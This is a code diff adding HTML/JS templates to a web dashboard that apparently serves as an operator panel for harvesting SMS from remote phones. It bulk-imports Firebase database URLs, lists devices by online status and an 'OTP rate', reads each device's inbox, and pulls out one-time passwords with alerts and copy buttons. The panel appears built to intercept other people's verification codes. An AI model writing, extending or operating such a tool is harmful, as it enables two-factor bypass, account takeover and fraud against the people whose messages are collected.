+    found.forEach(n => {
+      if(senderNums.has(n)) return;
+      if(n.startsWith('1800') || n.startsWith('1900') || n.startsWith('1991')) return;
+      counter[n] = (counter[n] || 0) + 1;
+    });
+  });
+  let topNum = null, topCount = 0;
+  for(const [num, cnt] of Object.entries(counter)){
+    if(cnt > topCount){ topNum = num; topCount = cnt; }
+  }
+  return topNum ? {number: topNum, count: topCount} : null;
+}
+
+function updateTopNumberBadge(msgs){
+  const badge = document.getElementById('top-number-badge');
+  const top = findTopNumber(msgs);
+  if(top && top.count >= 2){
+    document.getElementById('tn-num').textContent = '📞 ' + top.number;
+    document.getElementById('tn-count-badge').textContent = top.count + ' bar';
+    badge.classList.remove('hidden');
+  } else {
+    badge.classList.add('hidden');
+  }
+}
+
+async function loadInbox(showLoader){
+  if(!currentNum) return;
+  if(showLoader){
+    document.getElementById('sms-container').innerHTML =
+      '<div class="empty"><span class="spinner"></span> Refreshing...</div>';
+  }
+  const controller = new AbortController();
+  const timeoutId = setTimeout(() => controller.abort(), 15000);
+  try{
+    const r = await fetch('/api/inbox?fb=' + encodeURIComponent(currentNum.firebase)
+      + '&id=' + encodeURIComponent(currentNum.device_id)
+      + '&num=' + encodeURIComponent(currentNum.number), { signal: controller.signal });
+    clearTimeout(timeoutId);
+    const d = await r.json();
+    if(!d.success){
+      document.getElementById('sms-container').innerHTML =
+        '<div class="empty">❌ '+(d.error||'Error')+'</div>';
+      return;
+    }
+    const msgs = d.messages || [];
+    allInboxMsgs = msgs;
+    if(msgs.length > 0){
+      const newest = msgs[0];
+      const newestOtp = newest.otp || extractOtp(newest.message);
+      const sig = (newest.timestamp || 0) + '|' + newestOtp + '|' + (newest.message||'').slice(0,40);
+      if(newestOtp && sig !== lastOtpSeen){
+        lastOtpSeen = sig;
+        showOtpNotification(newestOtp, newest.from || 'Unknown', newest.message || '');
+      }
+    }
+    const sig = msgs.map(m => (m.timestamp||0) + '|' + (m.message||'').slice(0,40)).join('#');
+    if(sig !== lastInboxSig){
+      lastInboxSig = sig;
+      renderMessages();
+    }
+  }catch(e){
+    clearTimeout(timeoutId);
+  }
+}
+
+function timeAgo(ts, now){
+  if(!ts) return '';
+  const diff = now - ts;
+  if(diff < 10) return 'अभी';
+  if(diff < 60) return `${diff}s पहले`;
+  if(diff < 3600) return `${Math.floor(diff/60)}m पहले`;
+  if(diff < 86400) return `${Math.floor(diff/3600)}h पहले`;
+  return `${Math.floor(diff/86400)}d पहले`;
+}
+
+function highlightPhoneNumbers(text){
+  return text.replace(/(?<!\d)([6-9]\d{9})(?!\d)/g, '<span class="phone-highlight">$1</span>');
+}
+
+function renderMessages(){
+  const box = document.getElementById('sms-container');
+  const now = Math.floor(Date.now() / 1000);
+  let msgs = [...allInboxMsgs]
+    .sort((a, b) => (b.timestamp || 0) - (a.timestamp || 0))
+    .slice(0, 60);
+  
+  updateTopNumberBadge(msgs);
+  
+  if(!msgs.length){
+    box.innerHTML = `<div class="empty">📭 No SMS</div>`;
+    return;
+  }
+  box.innerHTML = '<div class="sms-list">' + msgs.map(m => {
+    const otp = m.otp || extractOtp(m.message);
+    let body;
+    if(otp){
+      body = escapeHtml(m.message).replace(otp, `<span class="otp-highlight">${otp}</span>`);
+      body = highlightPhoneNumbers(body);
+    } else {
+      body = highlightPhoneNumbers(escapeHtml(m.message));
+    }
+    const copyBtn = otp
+      ? `<button class="otp-copy-btn" onclick="copyOtp('${otp}')">📋 Copy OTP ${otp}</button>`
+      : '';
+    const ts = m.timestamp || 0;
+    const isFresh = ts >= (now - 120);
+    const cls = isFresh ? 'fresh' : (otp ? 'otp-item' : '');
+    const timeStr = m.date_string ? m.date_string : fmtTime(ts);
+    const ago = timeAgo(ts, now);
+    const newBadge = isFresh ? '<span class="new-badge">NEW</span>' : '';
+    const hasNumber = /[6-9]\d{9}/.test(m.message || '');
+    let typeBadge = '';
+    if(otp){ typeBadge = '<span class="msg-type-badge otp">OTP</span>'; }
+    else if(hasNumber){ typeBadge = '<span class="msg-type-badge number">📞 NUM</span>'; }
+    return `
+      <div class="sms-item ${cls}">
+        ${typeBadge}
+        <div class="sms-head">
+          <div class="sender">${escapeHtml(m.from || 'Unknown')} ${newBadge}</div>
+          <div style="text-align:right">
+            <div class="sms-time ${isFresh?'fresh':''}">${escapeHtml(timeStr)}</div>
+            <div class="time-ago ${isFresh?'fresh':''}">${ago}</div>
+          </div>
+        </div>
+        <div class="sms-body">${body}</div>
+        ${copyBtn}
+      </div>
+    `;
+  }).join('') + '</div>';
+}
+
+function backToList(){
+  document.getElementById('inbox-view').classList.add('hidden');
+  document.getElementById('list-view').classList.remove('hidden');
+  if(refreshTimer){ clearInterval(refreshTimer); refreshTimer = null; }
+  currentNum = null;
+}
+
+function extractOtp(text){
+  if(!text) return '';
+  const t = String(text);
+  let m = t.match(/(?:otp|one[- ]time|password|code|pin|verification|passcode)[^\d]{0,30}(\d{4,8})/i);
+  if(m) return m[1];
+  m = t.match(/(\d{4,8})[^\d]{0,30}(?:is your|otp|one[- ]time|code)/i);
+  if(m) return m[1];
+  m = t.match(/#(\d{4,8})/);
+  if(m) return m[1];
+  return '';
+}
+
+function fmtTime(ts){
+  if(!ts) return '';
+  try{
+    let t = parseInt(ts);
+    if(t > 1e12) t = Math.floor(t/1000);
+    if(t < 1e9) return String(ts);
+    const d = new Date(t * 1000);
+    const opts = { timeZone: 'Asia/Kolkata', hour12: true, day: '2-digit', month: '2-digit', year: 'numeric', hour: '2-digit', minute: '2-digit' };
+    return d.toLocaleString('en-IN', opts).replace(',', ' |');
+  }catch(e){ return String(ts); }
+}
+
+function copyOtp(code){
+  const done = ()=>toast('✅ Copied: ' + code);
+  if(navigator.clipboard){
+    navigator.clipboard.writeText(code).then(done).catch(()=>{
+      const ta = document.createElement('textarea');
+      ta.value = code; document.body.appendChild(ta);
+      ta.select(); document.execCommand('copy'); ta.remove(); done();
+    });
+  }
+}
+
+function escapeHtml(s){
+  return String(s == null ? '' : s).replace(/[&<>"']/g, c => ({
+    '&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'
+  })[c]);
+}
+
+checkConn();
+loadNumbers();
+setInterval(checkConn, 8000);
+setInterval(()=>{ if(!currentNum) loadNumbers(); }, 5000);
+</script>
+</body>
+</html>
+"""
+
+
+# ==================== PERSONAL OTP PANEL ====================
+PERSONAL_OTP_HTML = r"""<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8"><title>Personal OTP Panel</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+<meta name="theme-color" content="#059669">
+<style>""" + MOBILE_CSS + r"""
+body{background:#f7f8fc;color:#1e293b;min-height:100vh;padding:0 0 40px}
+.topbar{background:#fff;padding:10px 14px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100;box-shadow:0 1px 3px rgba(0,0,0,.05);flex-wrap:wrap;gap:8px;padding-top:calc(10px + env(safe-area-inset-top))}
+.brand{font-size:17px;font-weight:800;letter-spacing:-.5px}
+.brand .alex{background:linear-gradient(90deg,#059669,#10b981);-webkit-background-clip:text;background-clip:text;color:transparent}
+.brand .panel{color:#1e293b}
+.top-actions{display:flex;align-items:center;gap:8px}
+.refresh-btn{background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 12px rgba(5,150,105,.3);padding:0}
+.refresh-btn:active{transform:scale(.9) rotate(180deg)}
+.refresh-btn.spinning{animation:spin 1s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.nav{display:flex;gap:6px;align-items:center;flex-wrap:wrap;order:3;width:100%;justify-content:space-between}
+@media(min-width:640px){.nav{order:0;width:auto}}
+.nav-link{padding:10px 14px;border-radius:10px;text-decoration:none;font-size:13px;font-weight:600;color:#475569;background:#f1f5f9;white-space:nowrap;min-height:44px;display:inline-flex;align-items:center}
+.nav-link.active{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
+.nav-link.purple{background:linear-gradient(135deg,#ede9fe,#ddd6fe);color:#6d28d9}
+.conn{display:flex;align-items:center;gap:6px;font-size:11px;font-weight:600;padding:6px 10px;border-radius:20px}
+.conn.online{color:#16a34a;background:#dcfce7}
+.conn.offline{color:#dc2626;background:#fee2e2}
+.conn.loading{color:#d97706;background:#fef3c7}
+.conn .dot{width:8px;height:8px;border-radius:50%;background:currentColor}
+.conn.online .dot{animation:pulse 1.5s infinite}
+@keyframes pulse{0%,100%{opacity:1}50%{opacity:.4}}
+.container{max-width:900px;margin:0 auto;padding:14px}
+.stats{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin-bottom:14px}
+.stat{background:#fff;border-radius:14px;padding:14px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.stat .label{font-size:10px;color:#94a3b8;font-weight:600;letter-spacing:.5px;text-transform:uppercase;margin-bottom:6px}
+.stat .value{font-size:26px;font-weight:800;letter-spacing:-1px}
+.stat.total .value{color:#2563eb}
+.stat.online .value{color:#16a34a}
+.stat.offline .value{color:#dc2626}
+.stat.otp .value{color:#a855f7}
+.quick{background:#fff;border-radius:14px;padding:14px;margin-bottom:14px;display:flex;justify-content:space-between;align-items:center;box-shadow:0 2px 8px rgba(99,102,241,.06);flex-wrap:wrap;gap:10px}
+.quick .info{font-size:13px;color:#475569}
+.quick .info b{color:#1e293b;font-size:15px}
+.filter-live{display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap}
+.filter-live-btn{flex:1;min-width:130px;padding:14px 12px;border-radius:12px;border:2px solid transparent;cursor:pointer;font-size:13px;font-weight:700;display:flex;align-items:center;justify-content:center;gap:6px;background:none;font-family:inherit;min-height:52px}
+.filter-live-btn:active{transform:scale(.97)}
+.filter-live-btn.online{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;border-color:#86efac}
+.filter-live-btn.offline{background:linear-gradient(135deg,#fee2e2,#fecaca);color:#991b1b;border-color:#fca5a5}
+.filter-live-btn.active-filter{box-shadow:0 0 0 4px rgba(99,102,241,.3)}
+.filter-live-btn .count-badge{background:rgba(0,0,0,.15);padding:2px 8px;border-radius:10px;font-size:11px}
+.list-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:12px;padding:0 4px}
+.list-header h2{font-size:14px;font-weight:700;color:#334155}
+.list-header .count{font-size:12px;color:#64748b;background:#e2e8f0;padding:3px 10px;border-radius:20px;font-weight:600}
+.search-box{margin-bottom:12px}
+.search-box input{width:100%;padding:14px 16px;border-radius:12px;border:1.5px solid #e2e8f0;background:#fff;outline:none;color:#1e293b}
+.search-box input:focus{border-color:#10b981}
+.num-card{background:#fff;border-radius:14px;padding:14px;margin-bottom:10px;display:flex;align-items:center;gap:12px;cursor:pointer;min-height:70px}
+.num-card:active{transform:scale(.98);background:#fafafa}
+.num-icon{width:42px;height:42px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:19px;flex-shrink:0;background:linear-gradient(135deg,#dcfce7,#bbf7d0)}
+.num-icon.red{background:linear-gradient(135deg,#fee2e2,#fecaca)}
+.num-icon.gray{background:linear-gradient(135deg,#f1f5f9,#e2e8f0)}
+.num-info{flex:1;min-width:0}
+.num-title{font-size:14px;font-weight:700;color:#1e293b;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.num-title.unknown{color:#94a3b8;font-style:italic}
+.num-sub{font-size:11px;color:#94a3b8;margin-top:4px;display:flex;gap:4px;flex-wrap:wrap}
+.num-sub .pill{background:#f1f5f9;padding:2px 7px;border-radius:6px;color:#64748b;font-size:10px;font-weight:600}
+.num-sub .pill.otp{background:#ede9fe;color:#7c3aed}
+.badge-online{display:flex;align-items:center;gap:5px;font-size:11px;color:#16a34a;font-weight:600;flex-shrink:0}
+.badge-online .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
+.badge-offline{display:flex;align-items:center;gap:5px;font-size:11px;color:#dc2626;font-weight:600;flex-shrink:0}
+.badge-offline .dot{width:8px;height:8px;border-radius:50%;background:#dc2626}
+.arrow{color:#cbd5e1;font-size:20px}
+.fb-add-card{background:linear-gradient(135deg,#ecfdf5,#d1fae5);border:2px solid #6ee7b7;border-radius:14px;padding:16px;margin-bottom:14px}
+.fb-add-card h3{font-size:13px;font-weight:700;color:#065f46;margin-bottom:10px;display:flex;align-items:center;gap:8px}
+.fb-add-row{display:flex;gap:8px;flex-wrap:wrap}
+.fb-add-row input{flex:1;min-width:180px;padding:14px 12px;border-radius:10px;border:1.5px solid #6ee7b7;background:#fff;outline:none;color:#1e293b;font-family:monospace}
+.fb-add-row input:focus{border-color:#10b981;box-shadow:0 0 0 4px rgba(16,185,129,.15)}
+.fb-add-row button{padding:14px 18px;border:none;border-radius:10px;font-weight:600;font-size:14px;min-height:50px}
+.fb-add-row button.primary{background:linear-gradient(135deg,#059669,#10b981);color:#fff}
+.fb-add-row button.gray{background:#f1f5f9;color:#475569}
+.fb-add-row button:active{transform:scale(.96)}
+.bulk-area{margin-top:10px;display:none}
+.bulk-area textarea{width:100%;padding:14px 12px;border-radius:10px;border:1.5px solid #6ee7b7;background:#fff;font-size:13px;min-height:120px;font-family:monospace;outline:none;color:#1e293b;resize:vertical}
+.bulk-area button{margin-top:8px;padding:12px 18px;border:none;border-radius:10px;font-weight:600;font-size:13px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;min-height:48px}
+.fb-msg{margin-top:10px;padding:12px 14px;border-radius:10px;font-size:13px;display:none}
+.fb-msg.ok{background:#dcfce7;color:#166534;display:block}
+.fb-msg.err{background:#fee2e2;color:#991b1b;display:block}
+.my-fb-list{display:grid;gap:8px;margin-top:10px}
+.my-fb-card{background:#fff;border:1.5px solid #e2e8f0;border-radius:12px;padding:12px;display:flex;align-items:center;gap:10px}
+.my-fb-card .fb-icon{width:38px;height:38px;border-radius:9px;background:linear-gradient(135deg,#d1fae5,#a7f3d0);display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
+.my-fb-card .fb-info{flex:1;min-width:0}
+.my-fb-card .fb-label{font-size:12px;font-weight:700;color:#065f46;word-break:break-all}
+.my-fb-card .fb-hash{font-size:10px;color:#94a3b8;font-family:monospace;margin-top:2px}
+.my-fb-card .fb-actions button{padding:10px 14px;font-size:12px;background:#fef2f2;color:#dc2626;border:none;border-radius:8px;font-weight:600;min-height:42px}
+.inbox-header{background:#fff;border-radius:14px;padding:16px;margin-bottom:12px;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.inbox-top{display:flex;align-items:center;gap:10px;margin-bottom:12px}
+.back-btn{background:#f1f5f9;border:none;width:42px;height:42px;border-radius:50%;font-size:18px;cursor:pointer;color:#475569;font-weight:600;text-decoration:none;display:inline-flex;align-items:center;justify-content:center;flex-shrink:0}
+.back-btn:active{transform:scale(.9)}
+.inbox-num{font-size:16px;font-weight:800;color:#1e293b}
+.inbox-num.unknown{color:#94a3b8;font-style:italic}
+.inbox-status{display:flex;align-items:center;gap:6px;font-size:12px;color:#16a34a;font-weight:600;margin-top:2px}
+.inbox-status .dot{width:8px;height:8px;border-radius:50%;background:#16a34a}
+.inbox-status.offline{color:#dc2626}
+.inbox-status.offline .dot{background:#dc2626}
+.inbox-meta{font-size:11px;color:#94a3b8;display:flex;justify-content:space-between;align-items:center}
+.refresh-icon{cursor:pointer;font-size:20px;color:#94a3b8;padding:6px;min-width:36px;min-height:36px;display:flex;align-items:center;justify-content:center}
+.refresh-icon:active{transform:scale(.9)}
+.refresh-icon.spinning{animation:spin 1s linear infinite}
+.top-number-badge{background:linear-gradient(135deg,#fef3c7,#fde68a);border:2px solid #fbbf24;border-radius:12px;padding:12px 14px;margin-bottom:12px;display:flex;align-items:center;gap:10px;font-size:13px;font-weight:700;color:#92400e;box-shadow:0 2px 8px rgba(251,191,36,.2)}
+.top-number-badge .tn-icon{font-size:22px;flex-shrink:0}
+.top-number-badge .tn-info{flex:1;min-width:0}
+.top-number-badge .tn-num{font-size:16px;font-weight:800;color:#78350f;letter-spacing:.5px;word-break:break-all}
+.top-number-badge .tn-count{font-size:11px;color:#92400e;font-weight:600;margin-top:2px;opacity:.8}
+.top-number-badge .tn-highlight{background:#fbbf24;color:#78350f;padding:2px 8px;border-radius:8px;font-weight:800;font-size:11px}
+.sms-list{background:#fff;border-radius:14px;overflow:hidden;box-shadow:0 2px 8px rgba(99,102,241,.06)}
+.sms-item{padding:16px;border-bottom:1px solid #f1f5f9;position:relative}
+.sms-item:last-child{border-bottom:none}
+.sms-item.fresh{background:linear-gradient(90deg,#f0fdf4,#fff 60%);border-left:4px solid #16a34a}
+.sms-item.otp-item{background:linear-gradient(90deg,#faf5ff,#fff 60%);border-left:4px solid #a855f7}
+.sms-item .msg-type-badge{position:absolute;top:10px;right:10px;font-size:9px;font-weight:800;padding:2px 6px;border-radius:6px}
+.sms-item .msg-type-badge.otp{background:#a855f7;color:#fff}
+.sms-item .msg-type-badge.number{background:#16a34a;color:#fff}
+.sms-head{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:8px;gap:8px;flex-wrap:wrap}
+.sender{font-size:12px;font-weight:800;color:#ef4444;display:flex;align-items:center;flex-wrap:wrap}
+.new-badge{background:linear-gradient(135deg,#dc2626,#ef4444);color:#fff;font-size:9px;font-weight:800;padding:2px 6px;border-radius:10px;margin-left:6px}
+.sms-time{font-size:11px;color:#94a3b8;white-space:nowrap}
+.sms-time.fresh{color:#16a34a;font-weight:700}
+.time-ago{font-size:10px;color:#94a3b8;font-weight:600;margin-top:2px;text-align:right}
+.time-ago.fresh{color:#16a34a}
+.sms-body{font-size:14px;color:#334155;line-height:1.55;word-break:break-word;white-space:pre-wrap}
+.sms-body .phone-highlight{background:#fef3c7;color:#92400e;padding:1px 5px;border-radius:4px;font-weight:700;border:1px dashed #fbbf24}
+.otp-highlight{background:linear-gradient(135deg,#dcfce7,#bbf7d0);color:#166534;padding:2px 6px;border-radius:5px;font-weight:700;border:1px dashed #86efac}
+.otp-copy-btn{display:inline-flex;align-items:center;gap:6px;margin-top:10px;padding:10px 16px;background:linear-gradient(135deg,#059669,#10b981);color:#fff;border:none;border-radius:20px;font-weight:700;font-size:12px;min-height:40px}
+.otp-copy-btn:active{transform:scale(.96)}
+.empty{text-align:center;padding:50px 20px;color:#94a3b8;font-size:14px;background:#fff;border-radius:14px}
+.loading-text{text-align:center;padding:20px;color:#94a3b8;font-size:13px;background:#fff;border-radius:12px;margin-bottom:14px}
+.spinner{display:inline-block;width:16px;height:16px;border:2px solid #e2e8f0;border-top-color:#10b981;border-radius:50%;animation:spin .8s linear infinite;vertical-align:middle;margin-right:8px}
+.live-badge{display:inline-flex;align-items:center;gap:4px;background:#dcfce7;color:#166534;font-size:10px;font-weight:700;padding:3px 8px;border-radius:20px;margin-left:6px}
+.live-badge .dot{width:6px;height:6px;border-radius:50%;background:#16a34a;animation:pulse 1.2s infinite}
+.toast{position:fixed;bottom:30px;left:50%;transform:translateX(-50%) translateY(100px);background:#166534;color:#fff;padding:14px 24px;border-radius:12px;font-weight:600;font-size:14px;z-index:9999;transition:transform .3s;pointer-events:none;max-width:90vw;text-align:center}
+.toast.show{transform:translateX(-50%) translateY(0)}
+.hidden{display:none !important}
+@media(min-width:600px){.stats{grid-template-columns:repeat(4,1fr)}}</style></head><body>
+
+<div class="topbar">
+<div class="brand"><span class="alex">Personal</span> <span class="panel">OTP</span></div>
+<div class="top-actions">
+<button class="refresh-btn" id="refresh-btn" onclick="manualRefresh()" title="Refresh">🔄</button>
+<div class="conn loading" id="conn-badge"><span class="dot"></span><span id="conn-text">...</span></div>
+</div>
+<div class="nav"><a href="/" class="nav-link purple">📱 Numbers</a><a href="/otp" class="nav-link active">🔐 Personal OTP</a></div>
+</div>
+
+<div class="container">
+<div id="list-view">
+
+<div class="fb-add-card">
+<h3>➕ Add Your Firebase URL</h3>
+<div class="fb-add-row">
+<input id="fb-url" placeholder="https://xxx-default-rtdb.firebaseio.com" onkeypress="if(event.key==='Enter')addFirebase()" type="url" autocomplete="off">
+<button class="primary" id="add-btn" onclick="addFirebase()">Add</button>
+<button class="gray" id="bulk-toggle" onclick="toggleBulk()">Bulk</button>
+</div>
+<div id="bulk-area" class="bulk-area">
+<textarea id="fb-bulk" placeholder="Ek line me ek URL paste karo"></textarea>
+<button onclick="bulkAdd()">📥 Import All</button>
+</div>
+<div id="add-msg" class="fb-msg"></div>
+<div class="my-fb-list" id="my-fb-list"></div>
+</div>
+
+<div class="stats">
+<div class="stat total" id="stat-total"><div class="label">TOTAL</div><div class="value" id="s-total">0</div></div>
+<div class="stat online" id="stat-online"><div class="label">ONLINE</div><div class="value" id="s-online">0</div></div>
+<div class="stat offline" id="stat-offline"><div class="label">OFFLINE</div><div class="value" id="s-offline">0</div></div>
+<div class="stat otp" id="stat-otp"><div class="label">OTP RATE</div><div class="value" id="s-otp">0%</div></div>
+</div>
+<div class="quick"><div class="info">📱 Numbers : <b id="q-dev">0</b></div></div>
+<div class="filter-live">
+<button class="filter-live-btn online" id="btn-online" onclick="setLocalFilter('online')">🟢 Online <span class="count-badge" id="badge-online">0</span></button>
+<button class="filter-live-btn offline" id="btn-offline" onclick="setLocalFilter('offline')">🔴 Offline <span class="count-badge" id="badge-offline">0</span></button>
+</div>
+<div id="loading-text" class="loading-text"><span class="spinner"></span><span id="loading-msg">Add a firebase to start...</span></div>
+<div id="list-content" class="hidden">
+<div class="search-box"><input id="search-num" placeholder="🔎 Search number / device" oninput="renderNumbers()"></div>
+<div class="list-header"><h2 id="list-title">📱 All Numbers <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span></h2><span class="count" id="num-count">0</span></div>
+<div id="num-list"></div>
+</div>
+</div>
+
+<div id="inbox-view" class="hidden">
+<div class="inbox-header">
+<div class="inbox-top"><a href="#" class="back-btn" onclick="event.preventDefault();backToList()">←</a><div style="flex:1"><div class="inbox-num" id="inbox-num">+91 ------</div><div class="inbox-status" id="inbox-status"><span class="dot"></span><span id="inbox-status-text">Online</span></div></div></div>
+<div class="inbox-meta"><span>⚡ LIVE · auto 1s · Latest 60 SMS</span><span class="refresh-icon" onclick="loadInbox(true)">🔄</span></div>
+</div>
+<div id="top-number-badge" class="top-number-badge hidden">
+<div class="tn-icon">🏆</div>
+<div class="tn-info">
+<div class="tn-num" id="tn-num">-</div>
+<div class="tn-count">Sabse zyada baar aaya SMS me <span class="tn-highlight" id="tn-count-badge">0 bar</span></div>
+</div>
+</div>
+<div id="sms-container"></div>
+</div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+const COOKIE_NAME = "alex_personal_firebases_v2";
+let myFirebases = [];
+let allNumbers = [];
+let numbers = [];
+let currentNum = null;
+let refreshTimer = null;
+let lastSig = '';
+let lastInboxSig = '';
+let allInboxMsgs = [];
+let localFilter = 'all';
+let lastOtpSeen = '';
+let notifPermissionAsked = false;
+
+function getCookie(name){
+  const cookies = document.cookie.split(';');
+  for(let c of cookies){
+    c = c.trim();
+    if(c.indexOf(name + '=') === 0){
+      try{ return JSON.parse(decodeURIComponent(c.substring(name.length + 1))); }
+      catch(e){ return []; }
+    }
+  }
+  return [];
+}
+function setCookie(name, value, days){
+  const expires = new Date(Date.now() + days * 864e5).toUTCString();
+  document.cookie = name + '=' + encodeURIComponent(JSON.stringify(value)) + '; expires=' + expires + '; path=/; SameSite=Lax';
+}
+function saveMyFirebases(){ setCookie(COOKIE_NAME, myFirebases, 365); }
 
 function toast(text){
   const t = document.getElementById('toast');
@@ -1086,598 +1613,14 @@ function playOtpSound(){
     });
   }catch(e){}
 }
-
 function askNotificationPermission(){
   if(notifPermissionAsked) return;
   notifPermissionAsked = true;
   if('Notification' in window && Notification.permission === 'default'){ Notification.requestPermission(); }
 }
-
 function showOtpNotification(otp, from, message){
   toast('🔔 OTP: ' + otp + ' — ' + from);
   playOtpSound();
-  if('Notification' in window && Notification.permission === 'granted'){
-    try{ const n = new Notification('🔔 OTP: ' + otp, { body: from + '\n' + message.slice(0, 100), tag: 'otp-' + otp }); setTimeout(()=>n.close(), 10000); }catch(e){}
-  }
-  if(navigator.vibrate){ try{ navigator.vibrate([200, 100, 200, 100, 200]); }catch(e){} }
-}
-
-async function loadPanelState(){
-  try{
-    const r = await fetch('/api/panel/status_public');
-    const d = await r.json();
-    if(d.success){
-      panelState = d;
-      renderSessionBanner();
-    }
-  }catch(e){}
-}
-
-function renderSessionBanner(){
-  const wrap = document.getElementById('session-banner-wrap');
-  if(!wrap) return;
-  if(panelState.passwordless){
-    wrap.innerHTML = '<div class="session-banner"><span class="pulse"></span>🔓 PASSWORDLESS MODE · ACCESS GRANTED WITHOUT KEY</div>';
-  } else if(panelState.expires_at > 0){
-    const remaining = Math.max(0, panelState.expires_at - Math.floor(Date.now()/1000));
-    const hrs = Math.floor(remaining/3600);
-    const mins = Math.floor((remaining%3600)/60);
-    const secs = remaining%60;
-    wrap.innerHTML = `<div class="session-banner temp"><span class="pulse"></span>⏱ TEMPORARY ACCESS · ${hrs}h ${mins}m ${secs}s REMAINING</div>`;
-  } else {
-    wrap.innerHTML = '';
-  }
-}
-
-async function manualRefresh(){
-  const btn = document.getElementById('refresh-btn');
-  btn.classList.add('spinning');
-  toast('🔄 REFRESHING...');
-  try{
-    const r = await fetch('/api/refresh', {method: 'POST'});
-    const d = await r.json();
-    if(d.success){ setTimeout(()=>loadNumbers(), 800); toast('✅ REFRESH TRIGGERED'); }
-    else { toast('❌ ' + (d.error || 'FAILED')); }
-  }catch(e){ toast('❌ NETWORK ERROR'); }
-  setTimeout(()=>btn.classList.remove('spinning'), 1500);
-}
-
-function setLocalFilter(f){
-  if(localFilter === f){ localFilter = 'all'; }
-  else { localFilter = f; }
-  updateFilterButtons(); applyLocalFilter(); renderNumbers();
-}
-
-function updateFilterButtons(){
-  document.getElementById('btn-online').classList.toggle('active-filter', localFilter === 'online');
-  document.getElementById('btn-offline').classList.toggle('active-filter', localFilter === 'offline');
-  let titleText = '◉ ALL NUMBERS';
-  if(localFilter === 'online') titleText = '● ONLINE NUMBERS';
-  else if(localFilter === 'offline') titleText = '● OFFLINE NUMBERS';
-  document.getElementById('list-title').innerHTML = titleText + ' <span class="live-badge" id="live-badge" style="display:none"><span class="dot"></span>LIVE</span>';
-}
-
-function applyLocalFilter(){
-  if(localFilter === 'online') numbers = allNumbers.filter(n => n.online === true);
-  else if(localFilter === 'offline') numbers = allNumbers.filter(n => n.online !== true);
-  else numbers = allNumbers.slice();
-  document.getElementById('num-count').textContent = numbers.length;
-}
-
-async function checkConn(){
-  try{
-    const r = await fetch('/api/conn');
-    const d = await r.json();
-    const badge = document.getElementById('conn-badge');
-    const txt = document.getElementById('conn-text');
-    if(d.mongo_connected){ badge.className = 'conn online'; txt.textContent = 'LIVE'; }
-    else { badge.className = 'conn offline'; txt.textContent = 'OFF'; }
-  }catch(e){}
-}
-
-function flash(id){ const el = document.getElementById(id); if(!el) return; el.classList.add('flash'); setTimeout(()=>el.classList.remove('flash'), 400); }
-
-async function loadNumbers(){
-  try{
-    const r = await fetch('/api/numbers');
-    const d = await r.json();
-    if(!d.success){
-      if(d.error && d.error.includes('deactivated')){
-        document.body.innerHTML = '<div style="padding:40px;text-align:center;color:#ff3860;font-family:monospace;font-size:14px">🚫 PANEL DEACTIVATED BY ADMIN</div>';
-        return;
-      }
-      document.getElementById('loading-msg').textContent = '❌ '+(d.error||'ERROR');
-      return;
-    }
-    allNumbers = d.numbers || [];
-    if(parseInt(document.getElementById('s-total').textContent) !== d.total) flash('stat-total');
-    if(parseInt(document.getElementById('s-online').textContent) !== d.online) flash('stat-online');
-    if(parseInt(document.getElementById('s-offline').textContent) !== d.offline) flash('stat-offline');
-    document.getElementById('s-total').textContent = d.total;
-    document.getElementById('s-online').textContent = d.online;
-    document.getElementById('s-offline').textContent = d.offline;
-    document.getElementById('s-otp').textContent = d.otp_rate + '%';
-    document.getElementById('q-dev').textContent = allNumbers.length;
-    document.getElementById('badge-online').textContent = d.online;
-    document.getElementById('badge-offline').textContent = d.offline;
-    if(d.progress){
-      const pct = d.progress.total > 0 ? Math.floor(d.progress.done / d.progress.total * 100) : 0;
-      document.getElementById('prog-fill').style.width = pct + '%';
-      document.getElementById('loading-msg').textContent = `SCANNING ${d.progress.done}/${d.progress.total} (${pct}%)...`;
-    }
-    applyLocalFilter();
-    const badge = document.getElementById('live-badge');
-    if(d.loading && allNumbers.length > 0 && badge) badge.style.display = 'inline-flex';
-    else if(badge) badge.style.display = 'none';
-    if(allNumbers.length > 0){
-      document.getElementById('loading-text').classList.add('hidden');
-      document.getElementById('list-content').classList.remove('hidden');
-      const sig = allNumbers.length + '|' + d.online + '|' + d.otp_rate + '|' + localFilter;
-      if(sig !== lastSig){ lastSig = sig; renderNumbers(); }
-    } else if(d.loading){
-      document.getElementById('loading-text').classList.remove('hidden');
-      document.getElementById('list-content').classList.add('hidden');
-    } else {
-      document.getElementById('loading-text').classList.remove('hidden');
-      document.getElementById('loading-msg').textContent = '📭 NO NUMBERS FOUND';
-      document.getElementById('list-content').classList.add('hidden');
-    }
-  }catch(e){
-    document.getElementById('loading-msg').textContent = '❌ NETWORK ERROR';
-  }
-}
-
-function renderNumbers(){
-  const q = (document.getElementById('search-num').value || '').toLowerCase();
-  const box = document.getElementById('num-list');
-  const filtered = numbers.filter(n => !q || (n.number||'').toLowerCase().includes(q) || (n.device_name||'').toLowerCase().includes(q));
-  if(filtered.length === 0){ box.innerHTML = '<div class="empty">📭 NO NUMBERS FOUND</div>'; return; }
-  box.innerHTML = filtered.map(n => {
-    const isOnline = n.online === true;
-    const isUnknown = (n.number || '').startsWith('UNKNOWN-');
